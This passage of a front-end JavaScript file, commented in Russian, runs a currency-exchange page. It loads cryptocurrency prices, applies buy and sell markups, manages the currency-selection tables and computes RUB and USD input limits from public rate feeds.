// Новый код
let PRICE_BTC, PRICE_TON, PRICE_USDT, PRICE_DAI, PRICE_DOT, PRICE_USDC, PRICE_SOL, 
    PRICE_POL, PRICE_ETH, PRICE_ARB, PRICE_LTC, PRICE_BCH, PRICE_DASH, PRICE_ZEC, 
    PRICE_BNB, PRICE_XRP, PRICE_DOGE, PRICE_ETC, PRICE_XMR, PRICE_XLM, PRICE_TRX;

let PRICE_BTC_SELL, PRICE_TON_SELL, PRICE_USDT_SELL, PRICE_DAI_SELL, PRICE_DOT_SELL, PRICE_USDC_SELL, PRICE_SOL_SELL,
    PRICE_POL_SELL, PRICE_ETH_SELL, PRICE_ARB_SELL, PRICE_LTC_SELL, PRICE_BCH_SELL, PRICE_DASH_SELL, PRICE_ZEC_SELL,
    PRICE_BNB_SELL, PRICE_XRP_SELL, PRICE_DOGE_SELL, PRICE_ETC_SELL, PRICE_XMR_SELL, PRICE_XLM_SELL, PRICE_TRX_SELL;

let PRICE_BTC_BUY, PRICE_TON_BUY, PRICE_USDT_BUY, PRICE_DAI_BUY, PRICE_DOT_BUY, PRICE_USDC_BUY, PRICE_SOL_BUY,
    PRICE_POL_BUY, PRICE_ETH_BUY, PRICE_ARB_BUY, PRICE_LTC_BUY, PRICE_BCH_BUY, PRICE_DASH_BUY, PRICE_ZEC_BUY,
    PRICE_BNB_BUY, PRICE_XRP_BUY, PRICE_DOGE_BUY, PRICE_ETC_BUY, PRICE_XMR_BUY, PRICE_XLM_BUY, PRICE_TRX_BUY;

// let percentSell = 1.115;
// let percentBuy = 0.958;
// let percentSell_USD = 1.1123;
// let percentBuy_USD = 0.992;

let percentSell = 1.115;
let percentBuy = 0.95;
let percentSell_USD = 1.1123;
let percentBuy_USD = 0.992;

async function loadPrices() {
  try {
    const response = await fetch('../js/prices.json?t=' + Date.now());
    if (!response.ok) throw new Error(`HTTP ${response.status}`);

    const data = await response.json();
    const rates = data.rates;

    PRICE_BTC   = rates.BTC.price;
    PRICE_TON   = rates.TON.price;
    PRICE_USDT  = rates.USDT.price;
    PRICE_DAI   = rates.DAI.price;
    PRICE_DOT   = rates.DOT.price;
    PRICE_USDC  = rates.USDC.price;
    PRICE_SOL   = rates.SOL.price;
    PRICE_POL   = rates.POL.price;
    PRICE_ETH   = rates.ETH.price;
    PRICE_ARB   = rates.ARB.price;
    PRICE_LTC   = rates.LTC.price;
    PRICE_BCH   = rates.BCH.price;
    PRICE_DASH  = rates.DASH.price;
    PRICE_ZEC   = rates.ZEC.price;
    PRICE_BNB   = rates.BNB.price;
    PRICE_XRP   = rates.XRP.price;
    PRICE_DOGE  = rates.DOGE.price;
    PRICE_ETC   = rates.ETC.price;
    PRICE_XMR   = rates.XMR.price;
    PRICE_XLM   = rates.XLM.price;
    PRICE_TRX   = rates.TRX.price;

    PRICE_BTC_SELL   = rates.BTC.price * 1.05;
    PRICE_TON_SELL   = rates.TON.price * percentSell;
    PRICE_USDT_SELL  = rates.USDT.price * percentSell_USD;
    PRICE_USDC_SELL  = rates.USDC.price * percentSell_USD;
    PRICE_DAI_SELL   = rates.DAI.price * percentSell_USD;
    PRICE_DOT_SELL   = rates.DOT.price * percentSell;
    PRICE_SOL_SELL   = rates.SOL.price * percentSell;
    PRICE_POL_SELL   = rates.POL.price * percentSell;
    PRICE_ETH_SELL   = rates.ETH.price * percentSell;
    PRICE_ARB_SELL   = rates.ARB.price * percentSell;
    PRICE_LTC_SELL   = rates.LTC.price * percentSell;
    PRICE_BCH_SELL   = rates.BCH.price * percentSell;
    PRICE_DASH_SELL  = rates.DASH.price * percentSell;
    PRICE_ZEC_SELL   = rates.ZEC.price * percentSell;
    PRICE_BNB_SELL   = rates.BNB.price * percentSell;
    PRICE_XRP_SELL   = rates.XRP.price * percentSell;
    PRICE_DOGE_SELL  = rates.DOGE.price * percentSell;
    PRICE_ETC_SELL   = rates.ETC.price * percentSell;
    PRICE_XMR_SELL   = rates.XMR.price * percentSell;
    PRICE_XLM_SELL   = rates.XLM.price * percentSell;
    PRICE_TRX_SELL   = rates.TRX.price * percentSell;

    PRICE_BTC_BUY   = rates.BTC.price * 0.985;
    PRICE_TON_BUY   = rates.TON.price * percentBuy;
    PRICE_USDT_BUY  = rates.USDT.price * percentBuy_USD;
    PRICE_USDC_BUY  = rates.USDC.price * percentBuy_USD;
    PRICE_DAI_BUY   = rates.DAI.price * percentBuy_USD;
    PRICE_DOT_BUY   = rates.DOT.price * percentBuy;
    PRICE_SOL_BUY   = rates.SOL.price * percentBuy; 
    PRICE_POL_BUY   = rates.POL.price * percentBuy;
    PRICE_ETH_BUY   = rates.ETH.price * percentBuy;
    PRICE_ARB_BUY   = rates.ARB.price * percentBuy;
    PRICE_LTC_BUY   = rates.LTC.price * percentBuy;
    PRICE_BCH_BUY   = rates.BCH.price * percentBuy;
    PRICE_DASH_BUY  = rates.DASH.price * percentBuy;
    PRICE_ZEC_BUY   = rates.ZEC.price * percentBuy;
    PRICE_BNB_BUY   = rates.BNB.price * percentBuy;
    PRICE_XRP_BUY   = rates.XRP.price * percentBuy;
    PRICE_DOGE_BUY  = rates.DOGE.price * percentBuy;
    PRICE_ETC_BUY   = rates.ETC.price * percentBuy;
    PRICE_XMR_BUY   = rates.XMR.price * percentBuy;
    PRICE_XLM_BUY   = rates.XLM.price * percentBuy;
    PRICE_TRX_BUY   = rates.TRX.price * percentBuy;

    return true;
  } catch (err) {
    console.error('Ошибка загрузки курсов:', err);
    throw err;
  }
}

await loadPrices();

document.querySelector('.first__open-fix').addEventListener('click', event => {
    document.querySelector('.first__info-window-one').style.display = 'block';
    document.querySelector('.first__info-window-two').style.display = 'none';
    document.querySelector('.first__info-window-three').style.display = 'none';
})

document.querySelector('.first__info-window-one svg').addEventListener('click', event => {
    document.querySelector('.first__info-window-one').style.display = 'none';
})

document.querySelector('.first__open-more').addEventListener('click', event => {
    document.querySelector('.first__info-window-two').style.display = 'block';
    document.querySelector('.first__info-window-one').style.display = 'none';
    document.querySelector('.first__info-window-three').style.display = 'none';
})

document.querySelector('.first__info-window-two svg').addEventListener('click', event => {
    document.querySelector('.first__info-window-two').style.display = 'none';
})

document.querySelector('.first__open-three').addEventListener('click', event => {
    document.querySelector('.first__info-window-two').style.display = 'none';
    document.querySelector('.first__info-window-one').style.display = 'none';
    document.querySelector('.first__info-window-three').style.display = 'block';
})

document.querySelector('.first__info-window-three svg').addEventListener('click', event => {
    document.querySelector('.first__info-window-three').style.display = 'none';
})

// Надо ли заполнять некоторые поля

let needAML = false;
let needMEMO = false;
let needBANK = false;

// Функционал первой валюты

let valuteListOneActive = false;
document.querySelectorAll('.first__valute')[0].addEventListener('click', event => {
    if ( valuteListOneActive == false ) {
        document.querySelector('.table').style.display = 'block';
        document.querySelector('.first__get input').style.background = '#F2F4F5';
        valuteListOneActive = true;
    } else {
        document.querySelector('.table').style.display = 'none';
        document.querySelector('.first__get input').style.background = '#FFF';
        valuteListOneActive = false;
    }

    document.querySelector('.first__info-window-one').style.display = 'none';
    document.querySelector('.first__info-window-two').style.display = 'none';
    document.querySelector('.first__info-window-three').style.display = 'none';

    document.querySelector('.table-two').style.display = 'none';
    document.querySelector('.first__take input').style.background = '#FFF';
    document.querySelector('.table-three').style.display = 'none';
    activeBankList = false;
    valuteListTwoActive = false;
})

let valuteFirstName = 'СБП RUB';
let valuteFirstCode = 'SBP';
let valuteCategoryFirst = 'SBP';
let categoryButtonsFirst = 'all';

document.querySelectorAll('.table__button').forEach( (item, i) => {
    item.addEventListener('click', event => {

        document.querySelectorAll('.table__button').forEach( (item, i) => {
            item.classList.remove('table__button-active');
        })

        item.classList.add('table__button-active');

        document.querySelectorAll('.table__valute').forEach( (item, i) => {
            item.style.display = 'none';
        })
 
        if ( i == 0 ) {
            document.querySelectorAll('.table__valute').forEach( (item, i) => {
                item.style.display = 'flex';
                categoryButtonsFirst = 'all';
            })
        } else if ( i == 1 ) {
            document.querySelectorAll('.table__valute-sbp').forEach( (item, i) => {
                item.style.display = 'flex';
                categoryButtonsFirst = 'sbp';
            })
        } else if ( i == 2 ) {
            document.querySelectorAll('.table__valute-crypto').forEach( (item, i) => {
                item.style.display = 'flex';
                categoryButtonsFirst = 'crypto';
            })
        } else if ( i == 3 ) {
            document.querySelectorAll('.table__valute-paysystem').forEach( (item, i) => {
                item.style.display = 'flex';
                categoryButtonsFirst = 'paysystem';
            })
        } else if ( i == 4 ) {
            document.querySelectorAll('.table__valute-bank').forEach( (item, i) => {
                item.style.display = 'flex';
                categoryButtonsFirst = 'bank';
            })
        }

    })
})

document.querySelector('.table__search input').addEventListener('input', event => {
    document.querySelectorAll('.table__valute').forEach( (item, i) => {
        item.style.display = 'none';
    })

    document.querySelectorAll('.table__valute').forEach( (item, i) => {
        if ( document.querySelectorAll('.table__valute p')[i].textContent.toLowerCase().includes(document.querySelector('.table__search input').value.toLowerCase()) ) {
            item.style.display = 'flex';
            document.querySelector('.table__buttons').style.display = 'none';
        }
    })


    if ( document.querySelector('.table__search input').value == '' ) {

        document.querySelectorAll('.table__valute').forEach( (item, i) => {
            item.style.display = 'none';
        })

        if ( categoryButtonsFirst == 'all' ) {
            document.querySelectorAll('.table__valute').forEach( (item, i) => {
                item.style.display = 'flex';
            })
        } else if ( categoryButtonsFirst == 'sbp' ) {
            document.querySelectorAll('.table__valute-sbp').forEach( (item, i) => {
                item.style.display = 'flex';
            })
        } else if ( categoryButtonsFirst == 'crypto' ) {
            document.querySelectorAll('.table__valute-crypto').forEach( (item, i) => {
                item.style.display = 'flex';
            })
        } else if ( categoryButtonsFirst == 'paysystem' ) {
            document.querySelectorAll('.table__valute-paysystem').forEach( (item, i) => {
                item.style.display = 'flex';
            })
        } else if ( categoryButtonsFirst == 'bank' ) {
            document.querySelectorAll('.table__valute-bank').forEach( (item, i) => {
                item.style.display = 'flex';
            })
        }
        
        document.querySelector('.table__buttons').style.display = 'flex';
        document.querySelector('.table__search svg').style.display = 'none';
    } else if ( document.querySelector('.table__search input').value != '' ) {
        document.querySelector('.table__search svg').style.display = 'block';
    }
})

document.querySelector('.table__search svg').addEventListener('click', event => {
    document.querySelector('.table__search input').value = '';

    document.querySelectorAll('.table__valute').forEach( (item, i) => {
        item.style.display = 'none';
    })
    
    if ( categoryButtonsFirst == 'all' ) {
        document.querySelectorAll('.table__valute').forEach( (item, i) => {
            item.style.display = 'flex';
        })
    } else if ( categoryButtonsFirst == 'sbp' ) {
        document.querySelectorAll('.table__valute-sbp').forEach( (item, i) => {
            item.style.display = 'flex';
        })
    } else if ( categoryButtonsFirst == 'crypto' ) {
        document.querySelectorAll('.table__valute-crypto').forEach( (item, i) => {
            item.style.display = 'flex';
        })
    } else if ( categoryButtonsFirst == 'paysystem' ) {
        document.querySelectorAll('.table__valute-paysystem').forEach( (item, i) => {
            item.style.display = 'flex';
        })
    } else if ( categoryButtonsFirst == 'bank' ) {
        document.querySelectorAll('.table__valute-bank').forEach( (item, i) => {
            item.style.display = 'flex';
        })
    }

    document.querySelector('.table__buttons').style.display = 'flex';
})

// Выбор первой валюты

document.querySelectorAll('.table__valute').forEach( (item, i) => {
    item.addEventListener('click', event => {

        document.querySelector('.first__input-one').value = '';
        document.querySelector('.first__input-two').value = '';

        document.querySelectorAll('.first__valute img')[0].src = document.querySelectorAll('.table__valute img')[i].src;

        document.querySelectorAll('.table__valute').forEach( (item, i) => {
            item.classList.remove('table__valute-active');
        })

        item.classList.add('table__valute-active');

        document.querySelector('.table').style.display = 'none';
        document.querySelector('.first__get input').style.background = '#FFF';
        valuteListOneActive = false;

        valuteFirstName = document.querySelectorAll('.table__valute p')[i].textContent;

        if ( item.classList.value.includes('table__valute-sbp') ) {
            valuteCategoryFirst = 'SBP';
        } else if ( item.classList.value.includes('table__valute-crypto') ) {
            valuteCategoryFirst = 'CRYPTO';
        } else if ( item.classList.value.includes('table__valute-paysystem') ) {
            valuteCategoryFirst = 'PAYSYSTEM';
        } else if ( item.classList.value.includes('table__valute-bank') ) {
            valuteCategoryFirst = 'BANK';
        } else {
            valuteCategoryFirst = 'ALL';
        }

        hiddingSecondValutes();

        editTitle();

        document.querySelector('.first__get p').textContent = `Отдаете ${valuteFirstName}`;

        document.querySelectorAll('.table-two__button').forEach( (item, i) => {
            item.classList.remove('table-two__button-active');
        })

        document.querySelectorAll('.table-two__button')[0].classList.add('table-two__button-active');

        reChoosingSecondValute();

        rewriteLimitsNumbers();

        limitsInValute();

    })
})

// Убираем валюты с второй таблицы в зависимости от выбора первой валюты

function hiddingSecondValutes() {

    document.querySelectorAll('.table-two__button').forEach( (item, i) => {
        item.style.display = 'flex';
    })

    document.querySelectorAll('.table-two__valute').forEach( (item, i) => {
        item.style.display = 'flex';
    })

    if ( valuteCategoryFirst == 'SBP' ) {
        document.querySelectorAll('.table-two__button')[1].style.display = 'none';
        document.querySelectorAll('.table-two__button')[4].style.display = 'none';
        document.querySelectorAll('.table-two__valute-sbp').forEach( (item, i) => {
            item.style.display = 'none';
        })
        document.querySelectorAll('.table-two__valute-bank').forEach( (item, i) => {
            item.style.display = 'none';
        })
    } else if ( valuteCategoryFirst == 'CRYPTO' ) {
        document.querySelectorAll('.table-two__button')[3].style.display = 'none';
        document.querySelectorAll('.table-two__valute-paysystem').forEach( (item, i) => {
            item.style.display = 'none';
        })
    } else if ( valuteCategoryFirst == 'PAYSYSTEM' ) {
        document.querySelectorAll('.table-two__button')[2].style.display = 'none';
        document.querySelectorAll('.table-two__button')[3].style.display = 'none';
        document.querySelectorAll('.table-two__valute-crypto').forEach( (item, i) => {
            item.style.display = 'none';
        })
        document.querySelectorAll('.table-two__valute-paysystem').forEach( (item, i) => {
            item.style.display = 'none';
        })
    } else if ( valuteCategoryFirst == 'BANK' ) {
        document.querySelectorAll('.table-two__button')[1].style.display = 'none';
        document.querySelectorAll('.table-two__button')[4].style.display = 'none';
        document.querySelectorAll('.table-two__valute-sbp').forEach( (item, i) => {
            item.style.display = 'none';
        })
        document.querySelectorAll('.table-two__valute-bank').forEach( (item, i) => {
            item.style.display = 'none';
        })
    }

}

// Удаление из экрана категорий второй валюты

document.querySelectorAll('.table-two__button')[1].style.display = 'none';
document.querySelectorAll('.table-two__button')[4].style.display = 'none';

document.querySelectorAll('.table-two__valute-sbp').forEach( (item, i) => {
    item.style.display = 'none';
})

document.querySelectorAll('.table-two__valute-bank').forEach( (item, i) => {
    item.style.display = 'none';
})

// Функционал второй валюты

let valuteListTwoActive = false;
document.querySelectorAll('.first__valute')[1].addEventListener('click', event => {
    if ( valuteListTwoActive == false ) {
        document.querySelector('.table-two').style.display = 'block';
        document.querySelector('.first__take input').style.background = '#F2F4F5';
        valuteListTwoActive = true;
    } else {
        document.querySelector('.table-two').style.display = 'none';
        document.querySelector('.first__take input').style.background = '#FFF';
        valuteListTwoActive = false;
    }

    document.querySelector('.first__info-window-one').style.display = 'none';
    document.querySelector('.first__info-window-two').style.display = 'none';
    document.querySelector('.first__info-window-three').style.display = 'none';
    document.querySelector('.table-three').style.display = 'none';
    activeBankList = false;
})

let valuteSecondName = 'Bitcoin (BTC)';
let valuteCategorySecond = 'CRYPTO';
let valuteSecondCode = 'BTC';
let categoryButtonsSecond = 'all';

document.querySelectorAll('.table-two__button').forEach( (item, i) => {
    item.addEventListener('click', event => {

        document.querySelectorAll('.table-two__button').forEach( (item, i) => {
            item.classList.remove('table-two__button-active');
        })

        item.classList.add('table-two__button-active');

        document.querySelectorAll('.table-two__valute').forEach( (item, i) => {
            item.style.display = 'none';
        })

        if ( i == 0 ) {
            document.querySelectorAll('.table-two__valute').forEach( (item, i) => {
                item.style.display = 'flex';
                categoryButtonsSecond = 'all';
            })
        } else if ( i == 1 ) {
            document.querySelectorAll('.table-two__valute-sbp').forEach( (item, i) => {
                item.style.display = 'flex';
                categoryButtonsSecond = 'sbp';
            })
        } else if ( i == 2 ) {
            document.querySelectorAll('.table-two__valute-crypto').forEach( (item, i) => {
                item.style.display = 'flex';
                categoryButtonsSecond = 'crypto';
            })
        } else if ( i == 3 ) {
            document.querySelectorAll('.table-two__valute-paysystem').forEach( (item, i) => {
                item.style.display = 'flex';
                categoryButtonsSecond = 'paysystem';
            })
        } else if ( i == 4 ) {
            document.querySelectorAll('.table-two__valute-bank').forEach( (item, i) => {
                item.style.display = 'flex';
                categoryButtonsSecond = 'bank';
            })
        }

    })
})

document.querySelector('.table-two__search input').addEventListener('input', event => {
    document.querySelectorAll('.table-two__valute').forEach( (item, i) => {
        item.style.display = 'none';
    })

    document.querySelectorAll('.table-two__valute').forEach( (item, i) => {
        if ( document.querySelectorAll('.table-two__valute p')[i].textContent.toLowerCase().includes(document.querySelector('.table-two__search input').value.toLowerCase()) ) {
            item.style.display = 'flex';
            document.querySelector('.table-two__buttons').style.display = 'none';
        }

        if ( valuteCategoryFirst == 'SBP' ) {
            document.querySelectorAll('.table-two__valute-sbp').forEach( (item, i) => {
                item.style.display = 'none';
            })
            document.querySelectorAll('.table-two__valute-bank').forEach( (item, i) => {
                item.style.display = 'none';
            })
        } else if ( valuteCategoryFirst == 'CRYPTO' ) {
            document.querySelectorAll('.table-two__valute-paysystem').forEach( (item, i) => {
                item.style.display = 'none';
            })
        } else if ( valuteCategoryFirst == 'PAYSYSTEM' ) {
            document.querySelectorAll('.table-two__valute-crypto').forEach( (item, i) => {
                item.style.display = 'none';
            })
            document.querySelectorAll('.table-two__valute-paysystem').forEach( (item, i) => {
                item.style.display = 'none';
            })
        } else if ( valuteCategoryFirst == 'BANK' ) {
            document.querySelectorAll('.table-two__valute-sbp').forEach( (item, i) => {
                item.style.display = 'none';
            })
            document.querySelectorAll('.table-two__valute-bank').forEach( (item, i) => {
                item.style.display = 'none';
            })
        }

    })


    if ( document.querySelector('.table-two__search input').value == '' ) {

        document.querySelectorAll('.table-two__valute').forEach( (item, i) => {
            item.style.display = 'none';
        })

        if ( categoryButtonsSecond == 'all' ) {
            document.querySelectorAll('.table-two__valute').forEach( (item, i) => {
                item.style.display = 'flex';
            })
        } else if ( categoryButtonsSecond == 'sbp' ) {
            document.querySelectorAll('.table-two__valute-sbp').forEach( (item, i) => {
                item.style.display = 'flex';
            })
        } else if ( categoryButtonsSecond == 'crypto' ) {
            document.querySelectorAll('.table-two__valute-crypto').forEach( (item, i) => {
                item.style.display = 'flex';
            })
        } else if ( categoryButtonsSecond == 'paysystem' ) {
            document.querySelectorAll('.table-two__valute-paysystem').forEach( (item, i) => {
                item.style.display = 'flex';
            })
        } else if ( categoryButtonsSecond == 'bank' ) {
            document.querySelectorAll('.table-two__valute-bank').forEach( (item, i) => {
                item.style.display = 'flex';
            })
        }
        
        document.querySelector('.table-two__buttons').style.display = 'flex';
        document.querySelector('.table-two__search svg').style.display = 'none';
    } else if ( document.querySelector('.table-two__search input').value != '' ) {
        document.querySelector('.table-two__search svg').style.display = 'block';
    }
})

document.querySelector('.table-two__search svg').addEventListener('click', event => {
    document.querySelector('.table-two__search input').value = '';

    document.querySelectorAll('.table-two__valute').forEach( (item, i) => {
        item.style.display = 'none';
    })
    
    if ( categoryButtonsSecond == 'all' ) {
        document.querySelectorAll('.table-two__valute').forEach( (item, i) => {
            item.style.display = 'flex';
        })
    } else if ( categoryButtonsSecond == 'sbp' ) {
        document.querySelectorAll('.table-two__valute-sbp').forEach( (item, i) => {
            item.style.display = 'flex';
        })
    } else if ( categoryButtonsSecond == 'crypto' ) {
        document.querySelectorAll('.table-two__valute-crypto').forEach( (item, i) => {
            item.style.display = 'flex';
        })
    } else if ( categoryButtonsSecond == 'paysystem' ) {
        document.querySelectorAll('.table-two__valute-paysystem').forEach( (item, i) => {
            item.style.display = 'flex';
        })
    } else if ( categoryButtonsSecond == 'bank' ) {
        document.querySelectorAll('.table-two__valute-bank').forEach( (item, i) => {
            item.style.display = 'flex';
        })
    }

    document.querySelector('.table-two__buttons').style.display = 'flex';
})

// Выбор второй валюты

document.querySelectorAll('.table-two__valute').forEach( (item, i) => {
    item.addEventListener('click', event => {

        document.querySelector('.first__input-one').value = '';
        document.querySelector('.first__input-two').value = '';

        document.querySelectorAll('.first__valute img')[1].src = document.querySelectorAll('.table-two__valute img')[i].src;

        document.querySelectorAll('.table-two__valute').forEach( (item, i) => {
            item.classList.remove('table-two__valute-active');
        })

        item.classList.add('table-two__valute-active');

        document.querySelector('.table-two').style.display = 'none';
        document.querySelector('.first__take input').style.background = '#FFF';
        valuteListTwoActive = false;

        valuteSecondName = document.querySelectorAll('.table-two__valute p')[i].textContent;
        // valuteFirstCode = 'SBP';

        if ( item.classList.value.includes('table-two__valute-sbp') ) {
            valuteCategorySecond = 'SBP';
        } else if ( item.classList.value.includes('table-two__valute-crypto') ) {
            valuteCategorySecond = 'CRYPTO';
        } else if ( item.classList.value.includes('table-two__valute-paysystem') ) {
            valuteCategorySecond = 'PAYSYSTEM';
        } else if ( item.classList.value.includes('table-two__valute-bank') ) {
            valuteCategorySecond = 'BANK';
        } else {
            valuteCategorySecond = 'ALL';
        }

        editTitle();

        document.querySelector('.first__take p').textContent = `Получаете ${valuteSecondName}`;

        document.querySelector('.first__lft span').textContent = document.querySelectorAll('.table-two__reserv')[i].textContent;

        rewriteLimitsNumbers();

        limitsInValute();

    })
})

// Перезапись заголовка с валютами на первой странице

function editTitle() {
    if ( valuteCategoryFirst == 'BANK' || valuteCategoryFirst == 'SBP' ) {
        document.querySelector('.first__title p').textContent = `Купить ${valuteSecondName} за ${valuteFirstName}`;
    } else if ( valuteCategoryFirst == 'CRYPTO' && valuteCategorySecond == 'CRYPTO' ) {
        document.querySelector('.first__title p').textContent = `Купить ${valuteSecondName} за ${valuteFirstName}`;
    } else {
        document.querySelector('.first__title p').textContent = `Продать ${valuteFirstName} за ${valuteSecondName}`;
    }
    openingBankSection();
}

// Обработка кнопки "Всё" во второй таблице валют

document.querySelectorAll('.table-two__button')[0].addEventListener('click', event => {
    document.querySelectorAll('.table-two__valute').forEach( (item, i) => {
        item.style.display = 'flex';
    })

    if ( valuteCategoryFirst == 'SBP' ) {
        document.querySelectorAll('.table-two__valute-sbp').forEach( (item, i) => {
            item.style.display = 'none';
        })
        document.querySelectorAll('.table-two__valute-bank').forEach( (item, i) => {
            item.style.display = 'none';
        })
    } else if ( valuteCategoryFirst == 'CRYPTO' ) {
        document.querySelectorAll('.table-two__valute-paysystem').forEach( (item, i) => {
            item.style.display = 'none';
        })
    } else if ( valuteCategoryFirst == 'PAYSYSTEM' ) {
        document.querySelectorAll('.table-two__valute-crypto').forEach( (item, i) => {
            item.style.display = 'none';
        })
        document.querySelectorAll('.table-two__valute-paysystem').forEach( (item, i) => {
            item.style.display = 'none';
        })
    } else if ( valuteCategoryFirst == 'BANK' ) {
        document.querySelectorAll('.table-two__valute-sbp').forEach( (item, i) => {
            item.style.display = 'none';
        })
        document.querySelectorAll('.table-two__valute-bank').forEach( (item, i) => {
            item.style.display = 'none';
        })
    }
})

// Перевыбор второй валюты если её нету в доступных категориях после выбора первой валюты

function reChoosingSecondValute() {

    if ( valuteCategoryFirst == 'SBP' ) {
        if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
            valuteSecondName = 'Bitcoin (BTC)';
            valuteCategorySecond = 'CRYPTO';
            document.querySelector('.first__take p').textContent = `Получаете ${valuteSecondName}`;
            document.querySelector('.first__lft span').textContent = document.querySelectorAll('.table-two__reserv')[1].textContent;
            document.querySelectorAll('.first__valute img')[1].src = document.querySelectorAll('.table-two__valute img')[1].src;
            document.querySelectorAll('.table-two__valute').forEach( (item, i) => {
                item.classList.remove('table-two__valute-active');
            })
            document.querySelectorAll('.table-two__valute')[1].classList.add('table-two__valute-active');
        }
    } else if ( valuteCategoryFirst == 'CRYPTO' ) {
        if ( valuteCategorySecond == 'PAYSYSTEM' ) {
            valuteSecondName = 'Bitcoin (BTC)';
            valuteCategorySecond = 'CRYPTO';
            document.querySelector('.first__take p').textContent = `Получаете ${valuteSecondName}`;
            document.querySelector('.first__lft span').textContent = document.querySelectorAll('.table-two__reserv')[1].textContent;
            document.querySelectorAll('.first__valute img')[1].src = document.querySelectorAll('.table-two__valute img')[1].src;
            document.querySelectorAll('.table-two__valute').forEach( (item, i) => {
                item.classList.remove('table-two__valute-active');
            })
            document.querySelectorAll('.table-two__valute')[1].classList.add('table-two__valute-active');
        }
    } else if ( valuteCategoryFirst == 'PAYSYSTEM' ) {
        if ( valuteCategorySecond == 'CRYPTO' || valuteCategorySecond == 'PAYSYSTEM' ) {
            valuteSecondName = 'СБП RUB';
            valuteCategorySecond = 'SBP';
            document.querySelector('.first__take p').textContent = `Получаете ${valuteSecondName}`;
            document.querySelector('.first__lft span').textContent = document.querySelectorAll('.table-two__reserv')[0].textContent;
            document.querySelectorAll('.first__valute img')[1].src = document.querySelectorAll('.table-two__valute img')[0].src;
            document.querySelectorAll('.table-two__valute').forEach( (item, i) => {
                item.classList.remove('table-two__valute-active');
            })
            document.querySelectorAll('.table-two__valute')[0].classList.add('table-two__valute-active');
        }
    } else if ( valuteCategoryFirst == 'BANK' ) {
        if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
            valuteSecondName = 'Bitcoin (BTC)';
            valuteCategorySecond = 'CRYPTO';
            document.querySelector('.first__take p').textContent = `Получаете ${valuteSecondName}`;
            document.querySelector('.first__lft span').textContent = document.querySelectorAll('.table-two__reserv')[1].textContent;
            document.querySelectorAll('.first__valute img')[1].src = document.querySelectorAll('.table-two__valute img')[1].src;
            document.querySelectorAll('.table-two__valute').forEach( (item, i) => {
                item.classList.remove('table-two__valute-active');
            })
            document.querySelectorAll('.table-two__valute')[1].classList.add('table-two__valute-active');
        }
    }

    editTitle();
    writingTitleBottomArea();

}

// Изминение лимитов для полей ввода

let minLimitFirst = 7000;
let maxLimitFirst = 780000;
let minLimitSecond = 7000;
let maxLimitSecond = 780000;

let minLimitValuteFirst = 0;
let maxLimitValuteFirst = 0;
let minLimitValuteSecond = 0;
let maxLimitValuteSecond = 0;

function rewriteLimitsNumbers() {

    if ( valuteCategoryFirst == 'CRYPTO' && valuteCategorySecond == 'CRYPTO' ) {
        minLimitFirst = 7000;
        maxLimitFirst = 3000000;
        minLimitSecond = 7000;
        maxLimitSecond = 3000000;
    } else {
        minLimitFirst = 7000;
        maxLimitFirst = 780000;
        minLimitSecond = 7000;
        maxLimitSecond = 780000;
    }

}

function limitsInValute() {

    if ( valuteCategoryFirst == 'BANK' || valuteCategoryFirst == 'SBP' ) {
        document.querySelector('.first__input-one').placeholder = '7 000 - 780 000 RUB';
        minLimitFirst = 7000;
        maxLimitFirst = 780000;
    } else if ( valuteCategoryFirst == 'PAYSYSTEM' ) {

        async function getCurrencies(){  
            const url = 'https://www.cbr-xml-daily.ru/daily_json.js';
            const response = await fetch(url);
            const data = await response.json();

            minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
            maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

            minLimitValuteFirst = minLimitValuteFirst.toFixed(2);
            maxLimitValuteFirst = maxLimitValuteFirst.toFixed(2);
        
            document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${addedEmptyInNumbers(maxLimitValuteFirst)} USD`;
        }
    
        getCurrencies();

    } else if ( valuteCategoryFirst == 'CRYPTO' ) {

        fetch('https://api.exmo.com/v1/ticker/').then(async(result) => {
        if (result.status === 200 && result.ok) {
            return result.json()
        }
        }).then((JSON_DATA) => {

            const keys = Object.keys(JSON_DATA);
            const filtered = keys.map(name => name.split('_')[0]);
            const unique = [...new Set(filtered)];
            const line = unique.join(', ');

            async function getCurrencies(){  
                const url = 'https://www.cbr-xml-daily.ru/daily_json.js';
                const response = await fetch(url);
                const data = await response.json();

                if ( valuteCategoryFirst == 'CRYPTO' && valuteCategorySecond == 'CRYPTO' ) {
// 0.5559608
// 1.555045
                } else {
                    // let addedPercent = 1;
                    let addedPercent = 1;
                    PRICE_BTC = PRICE_BTC * addedPercent;
                    PRICE_USDT = PRICE_USDT * addedPercent;
                    PRICE_DAI = PRICE_DAI * addedPercent;
                    PRICE_DOT = PRICE_DOT * addedPercent;
                    PRICE_USDC = PRICE_USDC * addedPercent;
                    PRICE_SOL = PRICE_SOL * addedPercent;
                    PRICE_POL = PRICE_POL * addedPercent;
                    PRICE_ETH = PRICE_ETH * addedPercent;
                    PRICE_ARB = PRICE_ARB * addedPercent;
                    PRICE_LTC = PRICE_LTC * addedPercent;
                    PRICE_BCH = PRICE_BCH * addedPercent;
                    PRICE_XRP = PRICE_XRP * addedPercent;
                    PRICE_DOGE = PRICE_DOGE * addedPercent;
                    PRICE_ETC = PRICE_ETC * addedPercent;
                    PRICE_XLM = PRICE_XLM * addedPercent;
                    PRICE_TRX = PRICE_TRX * addedPercent;
                    PRICE_TON = PRICE_TON * addedPercent;
                    PRICE_DASH = PRICE_DASH * addedPercent;
                    PRICE_ZEC = PRICE_ZEC * addedPercent;
                    PRICE_BNB = PRICE_BNB * addedPercent;
                    PRICE_XMR = PRICE_XMR * addedPercent;
                }

                if ( valuteFirstName == 'Bitcoin (BTC)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_BTC;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_BTC;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(6);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(6);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${maxLimitValuteFirst} BTC`;
                } else if ( valuteFirstName == 'Tether ERC20 (USDT)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
